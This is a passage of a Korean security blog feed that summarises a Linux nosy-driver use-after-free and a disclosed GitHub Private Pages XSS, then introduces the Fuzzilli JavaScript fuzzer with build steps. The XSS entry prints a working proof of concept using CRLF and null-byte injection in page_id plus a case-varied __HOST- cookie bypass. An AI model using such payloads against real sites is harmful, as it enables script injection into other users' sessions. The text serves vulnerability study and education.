&#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCC98;&#xC74C; nosy device&#xB97C; &#xC5F4;&#xACE0; <code>NOSY_IOC_START</code> ioctl &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; client A&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0;, doubly linked list&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xB450;&#xBC88;&#xC9F8;&#xB85C;, nosy device&#xB97C; &#xC5F4;&#xACE0; <code>NOSY_IOC_START</code> ioctl &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; client B&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; &#xB611;&#xAC19;&#xC774; doubly linked list&#xC5D0; &#xCD94;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</li><li>client A&#xC5D0;&#xC11C; <code>NOSY_IOC_START ioctl</code> &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; client A&#xB294; doubly linked list&#xC5D0;&#xC11C; &#xC77D;&#xC5B4;&#xC9C0;&#xACE0;, doubly linked list&#xB294; &#xC5C9;&#xB9DD;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xCC98;&#xC74C; nosy device&#xB97C; &#xB2EB;&#xC73C;&#xBA74; <code>nosy_release</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA70; <code>nosy_release</code> &#xC5D0;&#xC11C; client A&#xAC00; unlink &#xB418;&#xACE0; free &#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xB450;&#xBC88;&#xC9F8; nosy device&#xB97C; &#xB2EB;&#xC73C;&#xBA74;, client A&#xAC00; &#xCC38;&#xC870;&#xB418;&#xC5B4; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>nosy driver</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Github Private Pages XSS 취약점</title>
    <link href="/2021/04/08/idioth/2021-04-08/"/>
    <url>/2021/04/08/idioth/2021-04-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://robertchen.cc/blog/2021/04/03/github-pages-xss">Breaking GitHub Private Pages for $35k</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>github private pages</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Github Private Pages&#xC5D0;&#xC11C; XSS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; github private pages&#xC758; custom authentication flow &#xACFC;&#xC815; &#xC911; <code>__Host-</code> prefix&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; <code>page_id</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>github pages&#xB294; &#xBCC4;&#xB3C4;&#xC758; <code>github.io</code> &#xB3C4;&#xBA54;&#xC778;&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD305; &#xB418;&#xC5B4; <code>github.com</code> &#xC778;&#xC99D; &#xCFE0;&#xD0A4;&#xAC00; private pages server&#xB85C; &#xC804;&#xC1A1;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; private page authentication&#xC740; <code>github.com</code>&#xACFC;&#xC758; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD1B5;&#xD569; &#xC5C6;&#xC774;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xD560; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC774;&#xC720;&#xB85C; github&#xC740; custom authentication flow&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4; &#xB2F9;&#xC2DC; github private pages&#xC758; custom authentication flow&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>private page&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xC11C;&#xBC84;&#xB294; <code>__Host-gh_pages_token</code>&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xCFE0;&#xD0A4;&#xAC00; &#xC5C6;&#xAC70;&#xB098; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0; <code>https://github.com/login</code>&#xC73C;&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xD2B8; &#xB429;&#xB2C8;&#xB2E4;. initial redirect&#xB294; <code>__Host-gh_pages_session</code> &#xCFE0;&#xD0A4;&#xC5D0; nonce&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCFE0;&#xD0A4;&#xB294; <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#attributes">__Host- cookie prefix</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD638;&#xC2A4;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xB3C4;&#xBA54;&#xC778;&#xC774; JavaScript&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>/login</code>&#xC740; <code>/pages/auth?nonce=&amp;page_id=&amp;path=</code>&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xD2B8; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB294; &#xC784;&#xC2DC; &#xC778;&#xC99D; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; <code>token</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; <code>https://pages-auth.github.com/redirect</code>&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. <code>nonce</code>, <code>page_id</code>, <code>path</code>&#xB294; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</li><li><code>/redirect</code>&#xB294; <code>https://repo.org.github.io/__/auth</code>&#xB85C; &#xBC14;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB294; <code>repo.org.github.io</code> &#xB3C4;&#xBA54;&#xC778;, <code>__Host-gh_pages_token</code>, <code>__Host-gh_pages_id</code>&#xC5D0; &#xC778;&#xC99D; &#xCFE0;&#xD0A4;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC774;&#xC804;&#xC5D0; &#xC124;&#xC815;&#xB41C; <code>__Host-gh_pages_session</code>&#xC758; <code>nonce</code>&#xB3C4; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li><li>authentication flow&#xC5D0;&#xC11C; original request path&#xC640; page id &#xAC19;&#xC740; &#xC815;&#xBCF4;&#xB294; <code>path</code>&#xC640; <code>page_id</code> &#xCFFC;&#xB9AC; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. nonce&#xB294; <code>nonce</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><p><code>https://repo.org.github.io/__/auth</code>&#xC758;  <code>page_id</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; whitespace&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xC5EC; &#xD30C;&#xC2F1; &#xB418;&#xACE0; &#xC815;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xC5B4; <code>Set-Cookie</code> &#xD5E4;&#xB354;&#xC5D0; &#xB80C;&#xB354;&#xB9C1; &#xB429;&#xB2C8;&#xB2E4;. <code>page_id=12345%0d%0a%0d%0a</code>&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; <code>Set-Cookie</code> &#xD5E4;&#xB354; &#xB4A4;&#xC5D0; &#xC704;&#xCE58;&#xD55C; Location &#xD5E4;&#xB354;&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xACE0; body content&#xB97C; &#xB80C;&#xB354;&#xB9C1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>page_id</code>&#xC5D0;&#xC11C; null byte&#xB97C; &#xB9CC;&#xB098;&#xBA74; integer parsing&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xD5E4;&#xB354;&#xC5D0; null byte&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; response&#xAC00; reject &#xB418;&#xBBC0;&#xB85C; body&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0; null byte&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC5EC; XSS&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs latex">&quot;?page_id&quot; + encodeURIComponent(&quot;<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>00&lt;script&gt;alert(origin)&lt;/script&gt;&quot;)</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; nonce&#xAC00; &#xC870;&#xC791;&#xB41C; <code>page_id</code>&#xC758; &#xC804;&#xC1A1;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xC5EC; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xCFE0;&#xD0A4;&#xC758; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xB2E4;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xC5EC; <code>__Host-</code>&#xC640; <code>__HOST-</code>&#xB97C; &#xB2E4;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; github private page server&#xC5D0;&#xC11C;&#xB294; &#xCFE0;&#xD0A4;&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xBBC0;&#xB85C; <code>__Host-</code> prefix &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC804;&#xCCB4;&#xC801;&#xC778; POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs perl">&lt;script&gt;const id = location.search.substring(<span class="hljs-string">&quot;?id=&quot;</span>.length)document.cookie = <span class="hljs-string">&quot;__HOST-gh_pages_session=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15; domain=.private-org.github.io&quot;</span>;location = <span class="hljs-string">&quot;https://github.com/pages/auth?nonce=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15&amp;page_id=&quot;</span> + id + <span class="hljs-string">&quot;%0d%0a%0d%0a%00&lt;script&gt;alert(origin)%3c%2fscript&gt;&amp;path=Lw&quot;</span>;&lt;<span class="hljs-regexp">/script&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 자바스크립트 엔진 Fuzzer - Fuzzilli</title>
    <link href="/2021/04/07/insu/fuzzilli/"/>
    <url>/2021/04/07/insu/fuzzilli/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzilli&#xB780;"><a href="#Fuzzilli&#xB780;" class="headerlink" title="Fuzzilli&#xB780;"></a>Fuzzilli&#xB780;</h1><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAE30;&#xC874;&#xC5D0; &#xC788;&#xB294; &#xBC29;&#xBC95;(&#xB79C;&#xB364;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xBC95; &#xB4F1;)&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C;&#xB294; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xD37C;&#xC9D5;&#xC744; &#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; sample&#xC744; &#xB9CC;&#xB4E4; &#xB54C; &#xBB38;&#xBC95;&#xC5D0; &#xB9DE;&#xB294; sample&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; <a href="https://github.com/googleprojectzero/domato">domato</a>&#xB77C;&#xB294; grammar-based &#xD37C;&#xC800;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. domato&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB8F0;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xC900; &#xB4A4; &#xADF8; &#xB8F0;&#xC5D0; &#xB530;&#xB77C; sample&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; domato&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled.png" alt></p><p><code>v4</code> &#xAC12;&#xC5D0; &#xB300;&#xD574; <code>slice</code>&#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xB54C; <code>slice</code>&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%201.png" alt></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%202.png" alt></p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; try-catch &#xBB38;&#xC744; &#xD1B5;&#xD574; &#xC608;&#xC678; &#xCC98;&#xB9AC;&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xC608;&#xC678;&#xAC00; &#xC77C;&#xC5B4;&#xB098;&#xB3C4; &#xB2E4;&#xC74C; &#xBB38;&#xC7A5;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; JIT compiler&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xC774; &#xB418;&#xBA74; try-catch&#xBB38;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640;&#xB294; &#xC544;&#xC608; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xB192;&#xC740; &#xC218;&#xC900;&#xC758; Semantic correctness&#xB97C; &#xAC00;&#xC9C4; sample&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB294;&#xB370; Fuzzill&#xB294; mutation&#xC744; &#xD1B5;&#xD574; semantically valid&#xD55C; &#xC0D8;&#xD50C;&#xB9CC; corpus&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xC5D0;&#xC11C;&#xB294; FuzzIL&#xC774;&#xB77C;&#xB294; custom intermediate &#xC5B8;&#xC5B4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; mutation&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%203.png" alt></p><p>&#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; FuzzIL&#xC740; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; JS &#xCF54;&#xB4DC;&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%204.png" alt></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%205.png" alt></p><p>FuzzIL&#xC5D0;&#xB294; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%206.png" alt></p><ul><li>Input Mutator - Input&#xC744; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</li><li>Operation Mutator - Operation&#xC744; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</li><li>Splice Mutator -  &#xB2E4;&#xB978; corpus&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC798;&#xB77C;&#xC640; &#xC0C8;&#xB85C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</li><li><p>Insertion Mutator - &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>  &#xB4F1;&#xB4F1; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC774;&#xB7EC;&#xD55C; mutator&#xC640; &#xD568;&#xAED8; feedback&#xC744; &#xCD94;&#xAC00;&#xD574; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xB192;&#xC774;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%207.png" alt></p><h1 id="Fuzzilli-&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;"><a href="#Fuzzilli-&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;" class="headerlink" title="Fuzzilli &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;"></a>Fuzzilli &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;</h1><p>Ubuntu 20.04 LTS&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; clang&#xACFC; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xB4E4;&#xC744; &#xC124;&#xCE58;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">apt-get install clang clang++ libicu-dev</code></pre><p>&#xBC84;&#xC804;&#xC5D0; &#xB9DE;&#xB294; <a href="https://swift.org/download/">swift</a>&#xB97C; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><p>swift&#xB97C; &#xC124;&#xCE58; &#xD55C; &#xB4A4; PATH&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">wget https:<span class="hljs-comment">//swift.org/builds/swift-5.3.3-release/ubuntu2004/swift-5.3.3-RELEASE/swift-5.3.3-RELEASE-ubuntu20.04.tar.gz</span>mkdir ~/swifttar -xvf swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>.tar.gz -C ~/swift<span class="hljs-keyword">export</span> PATH=~<span class="hljs-regexp">/swift/</span>swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>/usr/bin/:$PATH</code></pre><p>git&#xC744; &#xC774;&#xC6A9;&#xD574; fuzzilli&#xB97C; &#xBC1B;&#xC544; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//github.com/googleprojectzero/fuzzilli.git</span>cd swiftswift build -c release</code></pre><p>&#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD0C0;&#xAE43; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, chromium&#xC758; v8&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; v8 source&#xB97C; &#xBC1B;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><span class="hljs-keyword">export</span> PATH=<span class="hljs-regexp">/path/</span>to/depot_tools:$PATHmkdir ~/v8cd ~/v8fetch v8cd v8/path/to/fuzzilli/Targets/V8/fuzzbuild.sh</code></pre><p>&#xC644;&#xB8CC;&#xD558;&#xBA74; v8/out/fuzzbuild/d8&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p>fuzzilli&#xC640; v8&#xC744; &#xBAA8;&#xB450; &#xBE4C;&#xB4DC;&#xD588;&#xC73C;&#xBA74; &#xB2E4;&#xC74C;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; fuzzilli&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">swift run FuzzilliCli --profile=v8 ~<span class="hljs-regexp">/Desktop/</span>v8/v8/out/fuzzbuild/d8</code></pre><p>&#xC2E4;&#xD589;&#xD560; &#xB54C; &#xC5EC;&#xB7EC; &#xC635;&#xC158;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xB370; &#xC790;&#xC138;&#xD55C; &#xC635;&#xC158;&#xC740; github&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzilli-&#xBD84;&#xC11D;"><a href="#Fuzzilli-&#xBD84;&#xC11D;" class="headerlink" title="Fuzzilli &#xBD84;&#xC11D;"></a>Fuzzilli &#xBD84;&#xC11D;</h1><p>&#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB294; FuzzilIL&#xC744; test &#xD558;&#xAE30; &#xC704;&#xD574; &#xB9CC;&#xB4DC;&#xB294; FuzzIL&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; FuzzIL&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; mutation &#xACB0;&#xACFC;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift"><span class="hljs-keyword">let</span> b = makeBuilder() <span class="hljs-comment">//IL&#xC744; &#xB2F4;&#xC744; ProgramBuilder &#xC0DD;&#xC131;.</span>    <span class="hljs-keyword">let</span> f = b.definePlainFunction(withSignature: <span class="hljs-type">FunctionSignature</span>(withParameterCount: <span class="hljs-number">2</span>)) { params <span class="hljs-keyword">in</span> <span class="hljs-comment">//&#xC778;&#xC790;&#xB97C; 2&#xAC1C; &#xBC1B;&#xB294; &#xD568;&#xC218; &#xC120;&#xC5B8;</span>        <span class="hljs-keyword">let</span> x = b.loadProperty(<span class="hljs-string">&quot;x&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; x property&#xB97C; &#xAC00;&#xC838;&#xC634;.</span>        <span class="hljs-keyword">let</span> y = b.loadProperty(<span class="hljs-string">&quot;y&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; y property&#xB97C; &#xAC00;&#xC838;&#xC634;.</span>        <span class="hljs-keyword">let</span> s = b.binary(x, y, with: .<span class="hljs-type">Add</span>) <span class="hljs-comment">// x&#xC640; y&#xC758; &#xAC12;&#xC744; &#xB354; &#xD568;.(&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; x,y &#xAC12;&#xC758; &#xD569;.)</span>        <span class="hljs-keyword">let</span> p = b.binary(s, params[<span class="hljs-number">1</span>], with: .<span class="hljs-type">Mul</span>) <span class="hljs-comment">// s&#xC758; &#xAC12;&#xACFC; &#xB450;&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; &#xACF1;&#xD568;.</span>        b.doReturn(value: p) <span class="hljs-comment">// p&#xC758; &#xAC12;&#xC744; &#xB9AC;&#xD134;.</span>    }    b.forLoop(b.loadInt(<span class="hljs-number">0</span>), .lessThan, b.loadInt(<span class="hljs-number">1000</span>), .<span class="hljs-type">Add</span>, b.loadInt(<span class="hljs-number">1</span>)) { i <span class="hljs-keyword">in</span> <span class="hljs-comment">// &#xBC18;&#xBCF5;&#xBB38; &#xC120;&#xC5B8;, for(i=0;i&lt;1000;i++)</span>        <span class="hljs-keyword">let</span> x = b.loadInt(<span class="hljs-number">42</span>) <span class="hljs-comment">// x = 42</span>        <span class="hljs-keyword">let</span> y = b.loadInt(<span class="hljs-number">43</span>) <span class="hljs-comment">// y = 43</span>        <span class="hljs-keyword">let</span> arg1 = b.createObject(with: [<span class="hljs-string">&quot;x&quot;</span>: x, <span class="hljs-string">&quot;y&quot;</span>: y]) <span class="hljs-comment">// arg1 = {&quot;x&quot;:42, &quot;y&quot;:43}</span>        <span class="hljs-keyword">let</span> arg2 = i <span class="hljs-comment">//arg2 = i</span>        b.callFunction(f, withArgs: [arg1, arg2]) <span class="hljs-comment">//f(arg1, 